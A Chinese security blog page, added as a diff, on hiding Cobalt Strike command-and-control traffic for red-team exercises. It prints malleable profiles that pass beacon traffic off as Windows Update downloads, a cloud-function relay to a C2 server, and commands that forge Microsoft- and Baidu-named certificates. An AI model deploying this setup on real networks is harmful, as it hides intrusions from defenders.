@@ -1,0 +1,528 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>隐匿C2 | c0ys</title>
+<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="隐匿C2 | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="baiduspider" content="noindex, nofollow">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+
+<script>
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      const hitokoto = document.getElementById('hitokoto_text')
+      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      hitokoto.innerText = data.hitokoto
+    })
+    .catch(console.error)
+</script>
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+  
+    <meta name="description" content="序言
+这部分内容从去年hvv就看见有人提到，前不久有幸参与省级一次hvv的实际项目，认识到隐藏c2流量和转发流量在实际项目中的重要性。
+但苦于自己内网研究不深，cs一直踌躇不前。这篇准备总结网上主流方式。
+其实安全的一些知识都是在一些小圈子..." />
+    <meta name="keywords" content="Cobalt Strike,红蓝对抗" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0ys.cn">
+  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
+  </a>
+  <h1 class="site-title">
+    c0ys
+  </h1>
+  <p class="site-description" id="hitokoto">
+    <a id="hitokoto_text"> 吾心吾行澄如明镜，所作所为皆为正义。</a>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/talk" class="menu">
+          留言
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              隐匿C2
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-06-12
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://c0ys.cn/61mHbvb6l/" class="post-tag">
+                  # Cobalt Strike
+                </a>
+              
+                <a href="https://c0ys.cn/Ksx6TGJ4Ej/" class="post-tag">
+                  # 红蓝对抗
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://bu.dusays.com/2022/03/27/e7205278867f5.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="序言">序言</h1>
+<p>这部分内容从去年hvv就看见有人提到，前不久有幸参与省级一次hvv的实际项目，认识到隐藏c2流量和转发流量在实际项目中的重要性。</p>
+<p>但苦于自己内网研究不深，cs一直踌躇不前。这篇准备总结网上主流方式。</p>
+<p>其实安全的一些知识都是在一些小圈子内传播，比如知识星球了，微信公众号啦，所以关于这些内容去搜狗搜微信内容可能比在google效果还要好。另外先知也是不错的平台，<strong>特别是这三篇文章受益匪浅。</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/03/27/5ef0ebc84ffff.png" alt="" loading="lazy"></figure>
+<p>待我补充完善这篇文章的时候，已经离此文开篇过了3个多月了。懒，难。可能还是因为先前一个月大大小小的红蓝激发了我对c2的兴趣。</p>
+<h1 id="基础设置">基础设置</h1>
+<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/03/27/46465317e1ff5.png" alt="" loading="lazy"></figure>
+<p>域名：</p>
+<ul>
+<li>freenom不好用，注册慢不说，总要重登，域名还不生效和解析，果然白嫖还是太慢了。</li>
+<li><a href="https://www.namesilo.com">namesilo</a>，好用，正在用，便宜好用。</li>
+<li>狗爹，不负盛名，就是贵点，没接触。</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/03/27/b831460c40b13.png" alt="" loading="lazy"></figure>
+<h1 id="主流技术">主流技术</h1>
+<h2 id="域前置">域前置</h2>
+<p>大部分站点已经不支持域前置了。</p>
+<p>域前置技术跟CDN技术比较类似，都是会用到CDN，但域前置技术必须要用https，因为它是基于TLS协议的，域前置还有一个特点是需要修改请求包的host头，修改方法是修改malleable profile文件。</p>
+<p><strong>原理</strong>：</p>
+<p>同一个cdn厂商下倘若有两个域名a.com，b.com，这时候我们使用curl命令访问第一个a.com并将host名改为b.com这时候，实际访问的是b.com的内容。而一般的监测机制是不会检测host头的。</p>
+<p><strong>可达到的效果</strong>：</p>
+<p>通过一个高信任域名隐藏自己的真实域名与ip，且受害主机上的流量只有跟cdn通信的，不会有跟真实c2的。</p>
+<p><strong>技术实现重点：</strong></p>
+<ul>
+<li>需要基于https</li>
+<li>需要知道cdn上的其他高信誉域名或者ip</li>
+<li>需要修改malleable profile文件</li>
+</ul>
+<h2 id="cdn技术">CDN技术</h2>
+<p><strong>原理</strong>：</p>
+<p>让cdn转发合法的http或者https流量来达到隐藏的目的。</p>
+<p><strong>流程</strong>：</p>
+<ul>
+<li>配置了cdn</li>
+<li>拥有一个公网域名</li>
+<li>配置cdn的A记录解析使其能解析到C2的ip</li>
+<li>将公网域名填写到cs listener的host处并填写可用的端口</li>
+</ul>
+<p><strong>可达到的效果</strong>：</p>
+<p>受害主机上只会有跟cdn的ip通信的流量，不会有跟真实C2通信的流量，可以保护C2的ip，但是域名还是会暴露。</p>
+<p><strong>技术实现重点</strong>：</p>
+<ul>
+<li>一个不备案的域名，否则这个方式毫无用处</li>
+<li>这种技术对http与https没有强制要求，都可以使用，而域前置技术要求是https</li>
+</ul>
+<h2 id="重定向">重定向</h2>
+<h2 id="heroku代理">Heroku代理</h2>
+<h2 id="云函数">云函数</h2>
+<p>cs增加的配置文件：kris.profile</p>
+<pre><code class="language-JavaScript">set sample_name &quot;kris_abao&quot;;
+set sleeptime &quot;3000&quot;;
+set jitter    &quot;0&quot;;
+set maxdns    &quot;255&quot;;
+set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;
+http-get {
+set uri &quot;/api/getit&quot;;
+client {
+        header &quot;Accept&quot; &quot;*/*&quot;;
+        metadata {
+            base64;
+            prepend &quot;SESSIONID=&quot;;
+            header &quot;Cookie&quot;;
+        }
+    }
+server {
+        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;
+        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;
+        header &quot;Server&quot; &quot;Nodejs&quot;;
+        output {
+            base64;
+            print;
+        }
+    }
+}
+http-stager {  
+set uri_x86 &quot;/vue.min.js&quot;;
+set uri_x64 &quot;/bootstrap-2.min.js&quot;;
+}
+http-post {
+set uri &quot;/api/postit&quot;;
+client {
+        header &quot;Accept&quot; &quot;*/*&quot;;
+        id {
+            base64;
+            prepend &quot;JSESSION=&quot;;
+            header &quot;Cookie&quot;;
+        }
+        output {
+            base64;
+            print;
+        }
+    }
+server {
+        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;
+        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;
+        header &quot;Connection&quot; &quot;keep-alive&quot;;
+        output {
+            base64;
+            print;
+        }
+    }
+}
+</code></pre>
+<p>云函数代码：</p>
+<pre><code class="language-JavaScript"># -*- coding: utf8 -*-
+import json,requests,base64
+def main_handler(event, context):
+    C2='https://ip:port' # 这里可以使用 HTTP、HTTPS~下角标~
+    path=event['path']
+    headers=event['headers']
+    print(event)
+    if event['httpMethod'] == 'GET' :
+        resp=requests.get(C2+path,headers=headers,verify=False)
+    else:
+        resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
+        print(resp.headers)
+        print(resp.content)
+    response={
+        &quot;isBase64Encoded&quot;: True,
+        &quot;statusCode&quot;: resp.status_code,
+        &quot;headers&quot;: dict(resp.headers),
+        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]
+    }
+    return response
+
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://bu.dusays.com/2022/03/27/dd0f86ed4ad3a.png" alt="" loading="lazy"></figure>
+<h1 id="cdn-隐匿cs">CDN - 隐匿CS</h1>
+<h2 id="11-禁ping">1.1 禁ping</h2>
+<p>当服务器禁ping后，从某种角度可以判定为主机为不存活状态。</p>
+<p>编辑文件<code>/etc/sysctl.conf</code>，在里面增加一行。</p>
+<p><code>net.ipv4.icmp_echo_ignore_all=1</code>之后</p>
+<p>命令<code>sysctl -p</code>使配置生效</p>
+<h2 id="12-修改证书">1.2 修改证书</h2>
+<p>删除之前的<code>cobaltstrike.store</code>文件。</p>
+<p>再生成一遍证书。</p>
+<pre><code class="language-Bash">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu -dname &quot;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd, L=beijing, S=beijing, C=CN&quot;
+</code></pre>
+<p><code>keytool -list -keystore cobaltstrike.store</code> 查看证书。</p>
+<p>还有注意的点是修改文件<code>teamserver</code>，他的启动逻辑是，如果不存在<code>cobaltstrike.store</code>文件，就从这里生成新的密钥库。</p>
+<figure data-type="image" tabindex="5"><img src="https://bu.dusays.com/2022/03/27/bb3e76554a4ba.png" alt="" loading="lazy"></figure>
+<pre><code class="language-Bash">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Microsoft IT TLS CA 5, OU=Microsoft IT, O=Microsoft Corporation, L=Redmond, S=Washington, C=US&quot;
+</code></pre>
+<p>总之修改两个地方：</p>
+<ul>
+<li>删除<code>cobaltstrike.store</code></li>
+<li>修改teamserver默认生成的证书命令</li>
+</ul>
+<p>验证效果：</p>
+<pre><code class="language-Bash">curl http://IP:port -k -v
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://bu.dusays.com/2022/03/27/0a32ecde55414.png" alt="" loading="lazy"></figure>
+<h2 id="13-cdn厂商设置">1.3 CDN厂商设置</h2>
+<p>cs生成的木马中会带有服务器的部分信息如IP、域名，使用cdn就可以很好的隐藏住这部分信息，并且在一定程度上可以规避杀毒软件的主机特征查杀。并且在其他大佬的文章中看到https的监听方式中不会采用cobaltstrike.store的密钥库。所以这里申请一个证书代替https监听方式中的默认证书。</p>
+<p>使用cloudflare做说明</p>
+<ul>
+<li>关闭自动https重写和始终使用https、broti压缩</li>
+<li>配置SSL/TLS加密模式为完全</li>
+<li>关闭缓存，保持下面两项开启<br>
+<img src="https://bu.dusays.com/2022/03/27/be223e13c70d8.png" alt="" loading="lazy"></li>
+</ul>
+<h2 id="14-tls证书">1.4 TLS证书</h2>
+<p>页面申请证书，保存私钥和证书。</p>
+<pre><code class="language-Bash">openssl pkcs12 -export -in server.pem -inkey server.key -out spoofdomain.p12 -name sec.microsoft-cdn.top -passout pass:密码
+
+例子：
+openssl pkcs12 -export -in server.pem -inkey server.key -out spoofdomain.p12 -name sec.microsoft-cdn.top -passout pass:6evgqw4y8
+
+</code></pre>
+<pre><code class="language-Bash">keytool -importkeystore -deststorepass 密码 -destkeypass 密码 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass 密码 -alias 域名
+
+例子：
+keytool -importkeystore -deststorepass 6evgqw4y8 -destkeypass 6evgqw4y8 -destkeystore microsoft.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass 6evgqw4y8 -alias sec.microsoft-cdn.top
+
+</code></pre>
+<p>最终生成 microsoft.store 文件，（为cobalstrike.store的替代品）</p>
+<figure data-type="image" tabindex="7"><img src="https://bu.dusays.com/2022/03/27/5bbbc7f6ae154.png" alt="" loading="lazy"></figure>
+<h2 id="15-修改profile配置文件">1.5 修改profile配置文件</h2>
+<p>缝缝补补改了几遍，起码现在能用，后续再根据官方的说明定制化profile吧。</p>
+<pre><code class="language-Bash">#set https cert info
+#information assumed based on other Microsoft certs
+https-certificate {
+    set keystore &quot;microsoft.store&quot;;
+    set password &quot;6evgqw4y8&quot;;
+}
+
+#default Beacon sleep duration and jitter
+set sleeptime &quot;60000&quot;;
+set jitter    &quot;20&quot;;
+
+#default useragent for HTTP comms
+set useragent &quot;Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40&quot;;
+
+http-get {
+
+    set uri &quot;/c/msdownload/update/others/2020/12/29136388_&quot;;
+
+    client {
+
+        header &quot;Accept&quot; &quot;*/*&quot;;
+        header &quot;Host&quot; &quot;sec.microsoft-cdn.top&quot;;
+        
+        #session metadata
+        metadata {
+            base64url;
+            append &quot;.cab&quot;;
+            uri-append;
+        }
+    }
+
+
+    server {
+        header &quot;Content-Type&quot; &quot;application/vnd.ms-cab-compressed&quot;;
+        header &quot;Server&quot; &quot;Microsoft-IIS/8.5&quot;;
+        header &quot;MSRegion&quot; &quot;N. America&quot;;
+        header &quot;Connection&quot; &quot;keep-alive&quot;;
+        header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;;
+
+        #Beacon's tasks
+        output {
+
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri &quot;/api/4&quot;;
+    client {
+        header &quot;Host&quot; &quot;sec.microsoft-cdn.top&quot;;
+        id {
+            uri-append;
+        }
+        output{
+        print;
+        }
+    }
+    server {
+        output{
+        print;
+        }
+    }
+}
+#change the stager server
+http-stager {
+    set uri_x86 &quot;/get32.gif&quot;;
+    set uri_x64 &quot;/get64.gif&quot;;
+    client {
+            parameter &quot;pic&quot; &quot;ico&quot;;
+            header &quot;Cookie&quot; &quot;SomeValue&quot;;
+    }
+    server {
+            header &quot;Content-Type&quot; &quot;image/gif&quot;;
+            output {
+                prepend &quot;GIF89a&quot;;
+                print;
+            }
+    }
+}
+</code></pre>
+<h2 id="16-cdn通信端口注意">1.6 CDN通信端口注意</h2>
+<p>Cloudflare 支持的 HTTP 端口：</p>
+<ul>
+<li>80</li>
+<li>8080</li>
+<li>8880</li>
+<li>2052</li>
+<li>2082</li>
+<li>2086</li>
+<li>2095</li>
+</ul>
+<p>Cloudflare 支持的 HTTPS 端口：</p>
+<ul>
+<li>443</li>
+<li>2053</li>
+<li>2083</li>
+<li>2087</li>
+<li>2096</li>
+<li>8443</li>
+</ul>
+<p>所以生成木马和listener都要注意。</p>
+<figure data-type="image" tabindex="8"><img src="https://bu.dusays.com/2022/03/27/9a89fe184137f.png" alt="" loading="lazy"></figure>
+<p>注意选通信端口，选443可能会被ban，因为没备案。</p>
+<figure data-type="image" tabindex="9"><img src="https://bu.dusays.com/2022/03/27/4bf1a1ba1d52d.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://bu.dusays.com/2022/03/27/e7205278867f5.png" alt="" loading="lazy"></figure>
+<p>而且这个CDN地址会一直刷新。</p>
+
+                <blockquote>
+                  <p>声明：本博客文章所分享内容仅用于技术交流，禁止用于违法途径，所有渗透都需获取授权！否则需自行承担，本站及原作者不承担相应的后果。</p>
+                </blockquote>
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%BA%8F%E8%A8%80">序言</a></li>
+<li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E7%BD%AE">基础设置</a></li>
+<li><a href="#%E4%B8%BB%E6%B5%81%E6%8A%80%E6%9C%AF">主流技术</a>
+<ul>
+<li><a href="#%E5%9F%9F%E5%89%8D%E7%BD%AE">域前置</a></li>
+<li><a href="#cdn%E6%8A%80%E6%9C%AF">CDN技术</a></li>
+<li><a href="#%E9%87%8D%E5%AE%9A%E5%90%91">重定向</a></li>
+<li><a href="#heroku%E4%BB%A3%E7%90%86">Heroku代理</a></li>
+<li><a href="#%E4%BA%91%E5%87%BD%E6%95%B0">云函数</a></li>
+</ul>
+</li>
+<li><a href="#cdn-%E9%9A%90%E5%8C%BFcs">CDN - 隐匿CS</a>
+<ul>
+<li><a href="#11-%E7%A6%81ping">1.1 禁ping</a></li>
+<li><a href="#12-%E4%BF%AE%E6%94%B9%E8%AF%81%E4%B9%A6">1.2 修改证书</a></li>
+<li><a href="#13-cdn%E5%8E%82%E5%95%86%E8%AE%BE%E7%BD%AE">1.3 CDN厂商设置</a></li>
+<li><a href="#14-tls%E8%AF%81%E4%B9%A6">1.4 TLS证书</a></li>
+<li><a href="#15-%E4%BF%AE%E6%94%B9profile%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">1.5 修改profile配置文件</a></li>
+<li><a href="#16-cdn%E9%80%9A%E4%BF%A1%E7%AB%AF%E5%8F%A3%E6%B3%A8%E6%84%8F">1.6 CDN通信端口注意</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0ys.cn/post/vfZr-_y9w/">
+              <h3 class="post-title">
+                EVA
+              </h3>
+            </a>
+          </div>
+        
+      
+        
+            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>
+
+<div id="tcomment"></div>
+<script>
+twikoo.init({
+  envId: 'https://talk.c0ys.cn',
+  el: '#tcomment'
+})
+</script> 
+          
+
+        
+
+        <div class="site-footer">
+  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
+  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
